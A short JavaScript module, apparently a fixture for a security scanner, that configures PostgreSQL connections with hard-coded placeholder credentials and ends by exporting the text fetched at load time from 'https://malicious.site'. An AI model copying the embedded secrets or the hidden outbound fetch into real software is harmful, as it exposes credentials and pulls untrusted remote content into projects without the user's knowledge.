import { Pool, Client } from "pg";

const connectionString =
  "postgresql://root:secretpassword@database.com:3211/database";

export const pool = new Pool({
  user: "root",
  host: "database.com",
  database: "database",
  password: "secretpassword",
  port: 3211,
});

export const client = new Client({
  user: "root",
  host: "database.com",
  database: "database",
  password: "secretpassword",
  port: 3211,
});

export const unsafe = await (await fetch("https://malicious.site")).text();
